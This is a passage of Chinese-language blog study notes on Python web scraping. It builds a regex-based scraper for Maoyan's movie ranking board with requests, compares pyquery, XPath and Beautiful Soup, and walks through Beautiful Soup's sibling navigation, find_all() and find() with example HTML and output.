<p>并且电源的排行信息是class为board-index的i节点内<br>所以构造正则就是<br><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dd</span>&gt;</span>.*?board-index.*?&gt;(.*?)<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br></pre></td></tr></table></figure><br>还需要提取到电影的图片，仅检查后发现，a标签中的第二个img节点的data-src后面跟的是图片的地址<br>所以正则为<br><figure class="highlight dts"><table><tr><td class="code"><pre><span class="line"><span class="params">&lt;dd&gt;</span>.*?board-index.*?&gt;(.*?)<span class="params">&lt;/i&gt;</span>.*?data-src=<span class="string">"(.*?)"</span></span><br></pre></td></tr></table></figure><br>还需要提取电影的名称，它在p节点内，class为name，所以正则修改为<br><figure class="highlight livecodeserver"><table><tr><td class="code"><pre><span class="line">&lt;dd&gt;.*?board-index.*<span class="meta">?&gt;</span>(.*?)&lt;/i&gt;.*?data-src=<span class="string">"(.*?)"</span>.*?name.*?<span class="keyword">a</span>.*<span class="meta">?&gt;</span>(.*?)&lt;/<span class="keyword">a</span>&gt;</span><br></pre></td></tr></table></figure><br>用正则表达式测试工具测试之后，成功得到数据<br><img src="/img/python3/maoyan1.png" alt="avatar"></p>
<p>测试代码为：<br><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line"><span class="attribute">pattern</span>=re.compile('&lt;dd&gt;.*?board-index.*?&gt;(.*?)&lt;/i&gt;.*?data-src="(.*?)".*?name.*?a.*?&gt;(.*?)&lt;/a&gt;',re.S)</span><br><span class="line"><span class="attribute">items</span>=re.findall(pattern,html)</span><br><span class="line"><span class="builtin-name">print</span>(items)</span><br></pre></td></tr></table></figure></p>
<h2 id="最后代码"><a href="#最后代码" class="headerlink" title="最后代码"></a>最后代码</h2><figure class="highlight sqf"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">import re</span><br><span class="line">import <span class="built_in">time</span></span><br><span class="line"></span><br><span class="line">def geturl(i):</span><br><span class="line">    url=<span class="string">"https://maoyan.com/board/4?offset="</span>+<span class="built_in">str</span>(i)</span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">'User-Agent'</span>: <span class="string">'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.163 Safari/537.36'</span>,</span><br><span class="line">        <span class="string">'Accept'</span>:<span class="string">'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9'</span></span><br><span class="line">    &#125;</span><br><span class="line">    response=requests.get(url,headers=headers,allow_redirects=<span class="literal">False</span>)</span><br><span class="line">    <span class="meta"># print(response.content.decode(<span class="meta-string">'utf-8'</span>))</span></span><br><span class="line">    pattern = re.<span class="built_in">compile</span>(<span class="string">'&lt;dd&gt;.*?board-index.*?&gt;(.*?)&lt;/i&gt;.*?data-src="(.*?)".*?name.*?a.*?&gt;(.*?)&lt;/a&gt;'</span>, re.S)</span><br><span class="line">    <span class="built_in">items</span> = re.findall(pattern, response.<span class="built_in">text</span>)</span><br><span class="line">    print(<span class="built_in">items</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="variable">__name__</span> == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="keyword">for</span> i <span class="built_in">in</span> range(<span class="number">10</span>):</span><br><span class="line">        geturl(i * <span class="number">10</span>)</span><br><span class="line">        <span class="built_in">time</span>.<span class="built_in">sleep</span>(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>1.pyquery的CSS选择器方式对于熟悉html的人来说，更容易上手，但是功能相对于beautiful soup较为简单</p>
<p>2.beautiful soup , xpath , pyquery这三个解析器中，xpath是基础，beautiful soup功能较为复杂，但是更加灵活，pyquery较为简单，适合简单的工作</p>
<p>3.总结下来三个选择器常用的方法都差不多，查询子节点用children()，查询父母节点用parent()，祖先节点用parents()，查询属性用attrs() pyquery用attr()，获取文本用text()</p>
<p>4.使用pyquery前，需要实例化一个对象，而XPATH使用时只需要导入etree库，就可以使用，beautiful soup只需要导入Beautiful soup库，直接soup后面接方法即可</p>
<p>5.后两个解析器几乎都是由Xpath衍生出来的，目前最常用的是Xpath和beautiful soup</p>
<p>6.通过带师傅的讲解，明白了需要用函数来规范会操作，方便读代码和逻辑方面</p>
<p>7.当遇到重定向问题时，request库中的allow_redirects参数，可以禁止自动重定向</p>
<p>8.如果遇到反爬虫机制，可以采用time.sleep来让其延时等待，还可以BP抓包，讲headers的数据全部添加进去，模拟登录</p>
]]></content>
      <categories>
        <category>日常学习</category>
        <category>Python3开发</category>
        <category>爬虫</category>
      </categories>
      <tags>
        <tag>开发</tag>
      </tags>
  </entry>
  <entry>
    <title>Python3-2020/4/4-bp4</title>
    <url>/2020/04/04/Python3-2020-4-4-%E5%91%A8%E6%8A%A56/</url>
    <content><![CDATA[<h1 id="Beautiful-Soup"><a href="#Beautiful-Soup" class="headerlink" title="Beautiful Soup"></a>Beautiful Soup</h1><h2 id="关联选择"><a href="#关联选择" class="headerlink" title="关联选择"></a>关联选择</h2><h3 id="兄弟节点"><a href="#兄弟节点" class="headerlink" title="兄弟节点"></a>兄弟节点</h3><p>之前说明了子节点和父节点的获取方式，如果想要获取同级的节点，请看如下例子：<br><figure class="highlight smalltalk"><table><tr><td class="code"><pre><span class="line">html = <span class="comment">""</span><span class="comment">"</span></span><br><span class="line"><span class="comment">&lt;html&gt;</span></span><br><span class="line"><span class="comment">    &lt;body&gt;</span></span><br><span class="line"><span class="comment">        &lt;p class="</span>story<span class="comment">"&gt;</span></span><br><span class="line"><span class="comment">            Once upon a time there were three little sisters; and their names were</span></span><br><span class="line"><span class="comment">            &lt;a href="</span>http://example.com/elsie<span class="comment">" class="</span>sister<span class="comment">" id="</span>link1<span class="comment">"&gt;Bob&lt;/a&gt;&lt;a href="</span>http://example.com/lacie<span class="comment">" class="</span>sister<span class="comment">" id="</span>link2<span class="comment">"&gt;Lacie&lt;/a&gt;</span></span><br><span class="line"><span class="comment">        &lt;/p&gt;</span></span><br><span class="line"><span class="comment">"</span><span class="comment">""</span></span><br><span class="line">from bs4 import <span class="type">BeautifulSoup</span></span><br><span class="line">soup = <span class="type">BeautifulSoup</span>(html, <span class="string">'lxml'</span>)</span><br><span class="line">print(<span class="string">'Next Sibling'</span>,soup.a.next_sibling)</span><br><span class="line">print(<span class="string">'prev sibling'</span>,soup.a.previous_sibling)</span><br><span class="line"></span><br><span class="line">输出结果：</span><br><span class="line"><span class="type">Next</span> <span class="type">Sibling</span> &lt;a class=<span class="comment">"sister"</span> href=<span class="comment">"http://example.com/lacie"</span> id=<span class="comment">"link2"</span>&gt;<span class="type">Lacie</span>&lt;/a&gt;</span><br><span class="line">prev sibling </span><br><span class="line">            <span class="type">Once</span> upon a time there were three little sisters; and their names were</span><br></pre></td></tr></table></figure><br>这段代码中可以看到next_sibling和previous_sibling分别获取节点的下一个和上一个兄弟元素，next_sibling返回后面的兄弟节点，previous_siblings返回前面的兄弟节点</p>
<h3 id="提取数据"><a href="#提取数据" class="headerlink" title="提取数据"></a>提取数据</h3><p>如果想要获取比如文本，属性等，也可以用同样的方法：<br><figure class="highlight stata"><table><tr><td class="code"><pre><span class="line">html = <span class="string">""</span>"</span><br><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;body&gt;</span><br><span class="line">        &lt;p <span class="keyword">class</span>=<span class="string">"story"</span>&gt;</span><br><span class="line">            Once upon a time there were three little sisters; and their names were</span><br><span class="line">            &lt;a href=<span class="string">"http://example.com/elsie"</span> <span class="keyword">class</span>=<span class="string">"sister"</span> id=<span class="string">"link1"</span>&gt;Bob&lt;/a&gt;&lt;a href=<span class="string">"http://example.com/lacie"</span> <span class="keyword">class</span>=<span class="string">"sister"</span> id=<span class="string">"link2"</span>&gt;Lacie&lt;/a&gt;</span><br><span class="line">        &lt;/p&gt;</span><br><span class="line"><span class="string">""</span>"</span><br><span class="line">from bs4 import BeautifulSoup</span><br><span class="line">soup = BeautifulSoup(html, 'lxml')</span><br><span class="line"><span class="keyword">print</span>('Next Sibling:')</span><br><span class="line"><span class="keyword">print</span>(<span class="keyword">type</span>(soup.a.next_sibling))</span><br><span class="line"><span class="keyword">print</span>(soup.a.next_sibling)</span><br><span class="line"><span class="keyword">print</span>(soup.a.next_sibling.string)</span><br><span class="line"><span class="keyword">print</span>('Parent:')</span><br><span class="line"><span class="keyword">print</span>(<span class="keyword">type</span>(soup.a.parents))</span><br><span class="line"><span class="keyword">print</span>(<span class="keyword">list</span>(soup.a.parents)[0])</span><br><span class="line"><span class="keyword">print</span>(<span class="keyword">list</span>(soup.a.parents)[0].attrs['<span class="keyword">class</span>'])</span><br><span class="line"></span><br><span class="line">输出结果：</span><br><span class="line">Next Sibling:</span><br><span class="line">&lt;<span class="keyword">class</span> 'bs4.element.Tag'&gt;</span><br><span class="line">&lt;a <span class="keyword">class</span>=<span class="string">"sister"</span> href=<span class="string">"http://example.com/lacie"</span> id=<span class="string">"link2"</span>&gt;Lacie&lt;/a&gt;</span><br><span class="line">Lacie</span><br><span class="line">Parent:</span><br><span class="line">&lt;<span class="keyword">class</span> 'generator'&gt;</span><br><span class="line">&lt;p <span class="keyword">class</span>=<span class="string">"story"</span>&gt;</span><br><span class="line">            Once upon a time there were three little sisters; and their names were</span><br><span class="line">            &lt;a <span class="keyword">class</span>=<span class="string">"sister"</span> href=<span class="string">"http://example.com/elsie"</span> id=<span class="string">"link1"</span>&gt;Bob&lt;/a&gt;&lt;a <span class="keyword">class</span>=<span class="string">"sister"</span> href=<span class="string">"http://example.com/lacie"</span> id=<span class="string">"link2"</span>&gt;Lacie&lt;/a&gt;</span><br><span class="line">&lt;/p&gt;</span><br><span class="line">['story']</span><br></pre></td></tr></table></figure><br>调用string,attrs等获取文本和属性，如果返回多个节点，就可以转成列表后取出某个元素</p>
<h2 id="方法选择器"><a href="#方法选择器" class="headerlink" title="方法选择器"></a>方法选择器</h2><p>前面都是用属性来进行选择，对于比较复杂的选择就会比较繁琐，BS提供了像find()和find_all()这样的方法，只需要输入想查询的响应参数，就可以灵活查询了</p>
<h3 id="find-all"><a href="#find-all" class="headerlink" title="find_all()"></a>find_all()</h3><p>顾名思义就是查询所有符合条件的元素，类似于是正则表达里的贪心查询<br>API如下：<br><figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line">find<span class="constructor">_all(<span class="params">name</span>,<span class="params">attrs</span>,<span class="params">recursive</span>,<span class="params">text</span>,<span class="operator">**</span><span class="params">kwargs</span>)</span></span><br></pre></td></tr></table></figure></p>
<h4 id="name"><a href="#name" class="headerlink" title="name"></a>name</h4><p>我们可以根据节点名来查询元素<br><figure class="highlight stata"><table><tr><td class="code"><pre><span class="line">html='''</span><br><span class="line">&lt;div <span class="keyword">class</span>=<span class="string">"panel"</span>&gt;</span><br><span class="line">    &lt;div <span class="keyword">class</span>=<span class="string">"panel-heading"</span>&gt;</span><br><span class="line">        &lt;h4&gt;Hello&lt;/h4&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">    &lt;div <span class="keyword">class</span>=<span class="string">"panel-body"</span>&gt;</span><br><span class="line">        &lt;ul <span class="keyword">class</span>=<span class="string">"list"</span> id=<span class="string">"list-1"</span> name=<span class="string">"elements"</span>&gt;</span><br><span class="line">            &lt;<span class="keyword">li</span> <span class="keyword">class</span>=<span class="string">"element"</span>&gt;Foo&lt;/<span class="keyword">li</span>&gt;</span><br><span class="line">            &lt;<span class="keyword">li</span> <span class="keyword">class</span>=<span class="string">"element"</span>&gt;Bar&lt;/<span class="keyword">li</span>&gt;</span><br><span class="line">            &lt;<span class="keyword">li</span> <span class="keyword">class</span>=<span class="string">"element"</span>&gt;Jay&lt;/<span class="keyword">li</span>&gt;</span><br><span class="line">        &lt;/ul&gt;</span><br><span class="line">        &lt;ul <span class="keyword">class</span>=<span class="string">"list list-small"</span> id=<span class="string">"list-2"</span>&gt;</span><br><span class="line">            &lt;<span class="keyword">li</span> <span class="keyword">class</span>=<span class="string">"element"</span>&gt;Foo&lt;/<span class="keyword">li</span>&gt;</span><br><span class="line">            &lt;<span class="keyword">li</span> <span class="keyword">class</span>=<span class="string">"element"</span>&gt;Bar&lt;/<span class="keyword">li</span>&gt;</span><br><span class="line">        &lt;/ul&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">'''</span><br><span class="line">from bs4 import BeautifulSoup</span><br><span class="line">soup = BeautifulSoup(html, 'lxml')</span><br><span class="line"><span class="keyword">print</span>(soup.find_all(name='ul'))</span><br><span class="line"><span class="keyword">print</span>(<span class="keyword">type</span>(soup.find_all(name='ul')[0]))</span><br><span class="line"></span><br><span class="line">输出结果：</span><br><span class="line">[&lt;ul <span class="keyword">class</span>=<span class="string">"list"</span> id=<span class="string">"list-1"</span> name=<span class="string">"elements"</span>&gt;</span><br><span class="line">&lt;<span class="keyword">li</span> <span class="keyword">class</span>=<span class="string">"element"</span>&gt;Foo&lt;/<span class="keyword">li</span>&gt;</span><br><span class="line">&lt;<span class="keyword">li</span> <span class="keyword">class</span>=<span class="string">"element"</span>&gt;Bar&lt;/<span class="keyword">li</span>&gt;</span><br><span class="line">&lt;<span class="keyword">li</span> <span class="keyword">class</span>=<span class="string">"element"</span>&gt;Jay&lt;/<span class="keyword">li</span>&gt;</span><br><span class="line">&lt;/ul&gt;, &lt;ul <span class="keyword">class</span>=<span class="string">"list list-small"</span> id=<span class="string">"list-2"</span>&gt;</span><br><span class="line">&lt;<span class="keyword">li</span> <span class="keyword">class</span>=<span class="string">"element"</span>&gt;Foo&lt;/<span class="keyword">li</span>&gt;</span><br><span class="line">&lt;<span class="keyword">li</span> <span class="keyword">class</span>=<span class="string">"element"</span>&gt;Bar&lt;/<span class="keyword">li</span>&gt;</span><br><span class="line">&lt;/ul&gt;]</span><br><span class="line">&lt;<span class="keyword">class</span> 'bs4.element.Tag'&gt;</span><br></pre></td></tr></table></figure><br>调用了find_all()方法，传入name参数，其参数值为ul。想要查询所有ul节点，返回结果是列表类型</p>
<p>因为都是Tag类型，所以依然可以使用嵌套查询<br><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> ul <span class="keyword">in</span> soup.find_all(name=<span class="string">'ul'</span>):</span><br><span class="line">	print(ul.find_all(name=<span class="string">'li'</span>))</span><br><span class="line"></span><br><span class="line">输出结果：</span><br><span class="line">[&lt;li <span class="keyword">class</span>="<span class="symbol">element</span>"&gt;<span class="symbol">Foo</span>&lt;/<span class="symbol">li</span>&gt;, &lt;<span class="symbol">li</span> <span class="symbol">class</span>="<span class="symbol">element</span>"&gt;<span class="symbol">Bar</span>&lt;/<span class="symbol">li</span>&gt;, &lt;<span class="symbol">li</span> <span class="symbol">class</span>="<span class="symbol">element</span>"&gt;<span class="symbol">Jay</span>&lt;/<span class="symbol">li</span>&gt;]</span><br><span class="line">[&lt;<span class="symbol">li</span> <span class="symbol">class</span>="<span class="symbol">element</span>"&gt;<span class="symbol">Foo</span>&lt;/<span class="symbol">li</span>&gt;, &lt;<span class="symbol">li</span> <span class="symbol">class</span>="<span class="symbol">element</span>"&gt;<span class="symbol">Bar</span>&lt;/<span class="symbol">li</span>&gt;]</span><br></pre></td></tr></table></figure><br>返回的结果是列表类型，每个元素依然还是Tag类型</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> ul <span class="keyword">in</span> soup.find_all(name=<span class="string">'ul'</span>):</span><br><span class="line">    print(ul.find_all(name=<span class="string">'li'</span>))</span><br><span class="line">    <span class="keyword">for</span> li <span class="keyword">in</span> ul.find_all(name=<span class="string">'li'</span>):</span><br><span class="line">        print(li.<span class="built_in">string</span>)</span><br><span class="line">        </span><br><span class="line">输出结果：</span><br><span class="line">[&lt;li <span class="keyword">class</span>="<span class="symbol">element</span>"&gt;<span class="symbol">Foo</span>&lt;/<span class="symbol">li</span>&gt;, &lt;<span class="symbol">li</span> <span class="symbol">class</span>="<span class="symbol">element</span>"&gt;<span class="symbol">Bar</span>&lt;/<span class="symbol">li</span>&gt;, &lt;<span class="symbol">li</span> <span class="symbol">class</span>="<span class="symbol">element</span>"&gt;<span class="symbol">Jay</span>&lt;/<span class="symbol">li</span>&gt;]</span><br><span class="line"><span class="symbol">Foo</span></span><br><span class="line"><span class="symbol">Bar</span></span><br><span class="line"><span class="symbol">Jay</span></span><br><span class="line">[&lt;<span class="symbol">li</span> <span class="symbol">class</span>="<span class="symbol">element</span>"&gt;<span class="symbol">Foo</span>&lt;/<span class="symbol">li</span>&gt;, &lt;<span class="symbol">li</span> <span class="symbol">class</span>="<span class="symbol">element</span>"&gt;<span class="symbol">Bar</span>&lt;/<span class="symbol">li</span>&gt;]</span><br><span class="line"><span class="symbol">Foo</span></span><br><span class="line"><span class="symbol">Bar</span></span><br></pre></td></tr></table></figure>
<p>这样就可以获取到li标签的文本了</p>
<h4 id="attrs"><a href="#attrs" class="headerlink" title="attrs"></a>attrs</h4><p>除了节点名查询，还可以传入一些属性来查询<br><figure class="highlight stata"><table><tr><td class="code"><pre><span class="line">html='''</span><br><span class="line">&lt;div <span class="keyword">class</span>=<span class="string">"panel"</span>&gt;</span><br><span class="line">    &lt;div <span class="keyword">class</span>=<span class="string">"panel-heading"</span>&gt;</span><br><span class="line">        &lt;h4&gt;Hello&lt;/h4&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">    &lt;div <span class="keyword">class</span>=<span class="string">"panel-body"</span>&gt;</span><br><span class="line">        &lt;ul <span class="keyword">class</span>=<span class="string">"list"</span> id=<span class="string">"list-1"</span> name=<span class="string">"elements"</span>&gt;</span><br><span class="line">            &lt;<span class="keyword">li</span> <span class="keyword">class</span>=<span class="string">"element"</span>&gt;Foo&lt;/<span class="keyword">li</span>&gt;</span><br><span class="line">            &lt;<span class="keyword">li</span> <span class="keyword">class</span>=<span class="string">"element"</span>&gt;Bar&lt;/<span class="keyword">li</span>&gt;</span><br><span class="line">            &lt;<span class="keyword">li</span> <span class="keyword">class</span>=<span class="string">"element"</span>&gt;Jay&lt;/<span class="keyword">li</span>&gt;</span><br><span class="line">        &lt;/ul&gt;</span><br><span class="line">        &lt;ul <span class="keyword">class</span>=<span class="string">"list list-small"</span> id=<span class="string">"list-2"</span>&gt;</span><br><span class="line">            &lt;<span class="keyword">li</span> <span class="keyword">class</span>=<span class="string">"element"</span>&gt;Foo&lt;/<span class="keyword">li</span>&gt;</span><br><span class="line">            &lt;<span class="keyword">li</span> <span class="keyword">class</span>=<span class="string">"element"</span>&gt;Bar&lt;/<span class="keyword">li</span>&gt;</span><br><span class="line">        &lt;/ul&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">'''</span><br><span class="line">from bs4 import BeautifulSoup</span><br><span class="line">soup = BeautifulSoup(html, 'lxml')</span><br><span class="line"><span class="keyword">print</span>(soup.find_all(attrs=&#123;'id': '<span class="keyword">list</span>-1'&#125;))</span><br><span class="line"><span class="keyword">print</span>(soup.find_all(attrs=&#123;'name': 'elements'&#125;))</span><br><span class="line"></span><br><span class="line">输出结果：</span><br><span class="line">[&lt;ul <span class="keyword">class</span>=<span class="string">"list"</span> id=<span class="string">"list-1"</span> name=<span class="string">"elements"</span>&gt;</span><br><span class="line">&lt;<span class="keyword">li</span> <span class="keyword">class</span>=<span class="string">"element"</span>&gt;Foo&lt;/<span class="keyword">li</span>&gt;</span><br><span class="line">&lt;<span class="keyword">li</span> <span class="keyword">class</span>=<span class="string">"element"</span>&gt;Bar&lt;/<span class="keyword">li</span>&gt;</span><br><span class="line">&lt;<span class="keyword">li</span> <span class="keyword">class</span>=<span class="string">"element"</span>&gt;Jay&lt;/<span class="keyword">li</span>&gt;</span><br><span class="line">&lt;/ul&gt;]</span><br><span class="line">[&lt;ul <span class="keyword">class</span>=<span class="string">"list"</span> id=<span class="string">"list-1"</span> name=<span class="string">"elements"</span>&gt;</span><br><span class="line">&lt;<span class="keyword">li</span> <span class="keyword">class</span>=<span class="string">"element"</span>&gt;Foo&lt;/<span class="keyword">li</span>&gt;</span><br><span class="line">&lt;<span class="keyword">li</span> <span class="keyword">class</span>=<span class="string">"element"</span>&gt;Bar&lt;/<span class="keyword">li</span>&gt;</span><br><span class="line">&lt;<span class="keyword">li</span> <span class="keyword">class</span>=<span class="string">"element"</span>&gt;Jay&lt;/<span class="keyword">li</span>&gt;</span><br><span class="line">&lt;/ul&gt;]</span><br></pre></td></tr></table></figure><br>查询时传入的是attrs参数，参数类型是字典类型，要查询id为list-1的节点，就可以传入attrs={‘id’: ‘list-1’})的查询条件，返回的结果是列表形式，包含的内容就是符合id为list-1的所有节点</p>
<p>我们也可以不使用attrs来传递：<br><figure class="highlight stata"><table><tr><td class="code"><pre><span class="line">html='''</span><br><span class="line">&lt;div <span class="keyword">class</span>=<span class="string">"panel"</span>&gt;</span><br><span class="line">    &lt;div <span class="keyword">class</span>=<span class="string">"panel-heading"</span>&gt;</span><br><span class="line">        &lt;h4&gt;Hello&lt;/h4&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">    &lt;div <span class="keyword">class</span>=<span class="string">"panel-body"</span>&gt;</span><br><span class="line">        &lt;ul <span class="keyword">class</span>=<span class="string">"list"</span> id=<span class="string">"list-1"</span> name=<span class="string">"elements"</span>&gt;</span><br><span class="line">            &lt;<span class="keyword">li</span> <span class="keyword">class</span>=<span class="string">"element"</span>&gt;Foo&lt;/<span class="keyword">li</span>&gt;</span><br><span class="line">            &lt;<span class="keyword">li</span> <span class="keyword">class</span>=<span class="string">"element"</span>&gt;Bar&lt;/<span class="keyword">li</span>&gt;</span><br><span class="line">            &lt;<span class="keyword">li</span> <span class="keyword">class</span>=<span class="string">"element"</span>&gt;Jay&lt;/<span class="keyword">li</span>&gt;</span><br><span class="line">        &lt;/ul&gt;</span><br><span class="line">        &lt;ul <span class="keyword">class</span>=<span class="string">"list list-small"</span> id=<span class="string">"list-2"</span>&gt;</span><br><span class="line">            &lt;<span class="keyword">li</span> <span class="keyword">class</span>=<span class="string">"element"</span>&gt;Foo&lt;/<span class="keyword">li</span>&gt;</span><br><span class="line">            &lt;<span class="keyword">li</span> <span class="keyword">class</span>=<span class="string">"element"</span>&gt;Bar&lt;/<span class="keyword">li</span>&gt;</span><br><span class="line">        &lt;/ul&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">'''</span><br><span class="line">from bs4 import BeautifulSoup</span><br><span class="line">soup = BeautifulSoup(html, 'lxml')</span><br><span class="line"><span class="keyword">print</span>(soup.find_all(id='<span class="keyword">list</span>-1'))</span><br><span class="line"><span class="keyword">print</span>(soup.find_all(class_='element'))</span><br><span class="line"></span><br><span class="line">输出结果：</span><br><span class="line">[&lt;ul <span class="keyword">class</span>=<span class="string">"list"</span> id=<span class="string">"list-1"</span> name=<span class="string">"elements"</span>&gt;</span><br><span class="line">&lt;<span class="keyword">li</span> <span class="keyword">class</span>=<span class="string">"element"</span>&gt;Foo&lt;/<span class="keyword">li</span>&gt;</span><br><span class="line">&lt;<span class="keyword">li</span> <span class="keyword">class</span>=<span class="string">"element"</span>&gt;Bar&lt;/<span class="keyword">li</span>&gt;</span><br><span class="line">&lt;<span class="keyword">li</span> <span class="keyword">class</span>=<span class="string">"element"</span>&gt;Jay&lt;/<span class="keyword">li</span>&gt;</span><br><span class="line">&lt;/ul&gt;]</span><br><span class="line">[&lt;<span class="keyword">li</span> <span class="keyword">class</span>=<span class="string">"element"</span>&gt;Foo&lt;/<span class="keyword">li</span>&gt;, &lt;<span class="keyword">li</span> <span class="keyword">class</span>=<span class="string">"element"</span>&gt;Bar&lt;/<span class="keyword">li</span>&gt;, &lt;<span class="keyword">li</span> <span class="keyword">class</span>=<span class="string">"element"</span>&gt;Jay&lt;/<span class="keyword">li</span>&gt;, &lt;<span class="keyword">li</span> <span class="keyword">class</span>=<span class="string">"element"</span>&gt;Foo&lt;/<span class="keyword">li</span>&gt;, &lt;<span class="keyword">li</span> <span class="keyword">class</span>=<span class="string">"element"</span>&gt;Bar&lt;/<span class="keyword">li</span>&gt;]</span><br></pre></td></tr></table></figure></p>
<p>在这里class对于Python来说是一个关键字，所以后面需要加一个下划线来进行区分</p>
<h4 id="text"><a href="#text" class="headerlink" title="text"></a>text</h4><p>text参数可以用来匹配节点的文本，传入的形式可以是字符串，可以是正则表达式<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line">html=<span class="string">'''</span></span><br><span class="line"><span class="string">&lt;div class="panel"&gt;</span></span><br><span class="line"><span class="string">    &lt;div class="panel-body"&gt;</span></span><br><span class="line"><span class="string">        &lt;a&gt;Hello, this is a link&lt;/a&gt;</span></span><br><span class="line"><span class="string">        &lt;a&gt;Hello, this is a link, too&lt;/a&gt;</span></span><br><span class="line"><span class="string">    &lt;/div&gt;</span></span><br><span class="line"><span class="string">&lt;/div&gt;</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line">soup = BeautifulSoup(html, <span class="string">'lxml'</span>)</span><br><span class="line">print(soup.find_all(text=re.compile(<span class="string">'link'</span>)))</span><br><span class="line"></span><br><span class="line">输出结果：</span><br><span class="line">[<span class="string">'Hello, this is a link'</span>, <span class="string">'Hello, this is a link, too'</span>]</span><br></pre></td></tr></table></figure></p>
<p>这里有两个a节点，而且用来find_all方法，所以文本里含link的结果都会被返回出来</p>
<h3 id="find"><a href="#find" class="headerlink" title="find()"></a>find()</h3><p>find()方法和find_all()方法的区别就是find()方法用于查询单个元素，也就是第一个匹配的元素<br><figure class="highlight stata"><table><tr><td class="code"><pre><span class="line">html='''</span><br><span class="line">&lt;div <span class="keyword">class</span>=<span class="string">"panel"</span>&gt;</span><br><span class="line">    &lt;div <span class="keyword">class</span>=<span class="string">"panel-heading"</span>&gt;</span><br><span class="line">        &lt;h4&gt;Hello&lt;/h4&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">    &lt;div <span class="keyword">class</span>=<span class="string">"panel-body"</span>&gt;</span><br><span class="line">        &lt;ul <span class="keyword">class</span>=<span class="string">"list"</span> id=<span class="string">"list-1"</span>&gt;</span><br><span class="line">            &lt;<span class="keyword">li</span> <span class="keyword">class</span>=<span class="string">"element"</span>&gt;Foo&lt;/<span class="keyword">li</span>&gt;</span><br><span class="line">            &lt;<span class="keyword">li</span> <span class="keyword">class</span>=<span class="string">"element"</span>&gt;Bar&lt;/<span class="keyword">li</span>&gt;</span><br><span class="line">            &lt;<span class="keyword">li</span> <span class="keyword">class</span>=<span class="string">"element"</span>&gt;Jay&lt;/<span class="keyword">li</span>&gt;</span><br><span class="line">        &lt;/ul&gt;</span><br><span class="line">        &lt;ul <span class="keyword">class</span>=<span class="string">"list list-small"</span> id=<span class="string">"list-2"</span>&gt;</span><br><span class="line">            &lt;<span class="keyword">li</span> <span class="keyword">class</span>=<span class="string">"element"</span>&gt;Foo&lt;/<span class="keyword">li</span>&gt;</span><br><span class="line">            &lt;<span class="keyword">li</span> <span class="keyword">class</span>=<span class="string">"element"</span>&gt;Bar&lt;/<span class="keyword">li</span>&gt;</span><br><span class="line">        &lt;/ul&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">'''</span><br><span class="line">from bs4 import BeautifulSoup</span><br><span class="line">soup = BeautifulSoup(html, 'lxml')</span><br><span class="line"><span class="keyword">print</span>(soup.find(name='ul'))</span><br><span class="line"><span class="keyword">print</span>(<span class="keyword">type</span>(soup.find(name='ul')))</span><br><span class="line"><span class="keyword">print</span>(soup.find(class_='<span class="keyword">list</span>'))</span><br><span class="line"></span><br><span class="line">输出结果：</span><br><span class="line">&lt;ul <span class="keyword">class</span>=<span class="string">"list"</span> id=<span class="string">"list-1"</span>&gt;</span><br><span class="line">&lt;<span class="keyword">li</span> <span class="keyword">class</span>=<span class="string">"element"</span>&gt;Foo&lt;/<span class="keyword">li</span>&gt;</span><br><span class="line">&lt;<span class="keyword">li</span> <span class="keyword">class</span>=<span class="string">"element"</span>&gt;Bar&lt;/<span class="keyword">li</span>&gt;</span><br><span class="line">&lt;<span class="keyword">li</span> <span class="keyword">class</span>=<span class="string">"element"</span>&gt;Jay&lt;/<span class="keyword">li</span>&gt;</span><br><span class="line">&lt;/ul&gt;</span><br><span class="line">&lt;<span class="keyword">class</span> 'bs4.element.Tag'&gt;</span><br><span class="line">&lt;ul <span class="keyword">class</span>=<span class="string">"list"</span> id=<span class="string">"list-1"</span>&gt;</span><br><span class="line">&lt;<span class="keyword">li</span> <span class="keyword">class</span>=<span class="string">"element"</span>&gt;Foo&lt;/<span class="keyword">li</span>&gt;</span><br><span class="line">&lt;<span class="keyword">li</span> <span class="keyword">class</span>=<span class="string">"element"</span>&gt;Bar&lt;/<span class="keyword">li</span>&gt;</span><br><span class="line">&lt;<span class="keyword">li</span> <span class="keyword">class</span>=<span class="string">"element"</span>&gt;Jay&lt;/<span class="keyword">li</span>&gt;</span><br><span class="line">&lt;/ul&gt;</span><br></pre></td></tr></table></figure><br>返回结果不再是列表类型，而是第一个匹配的节点元素，返回结果依然是Tag类型</p>
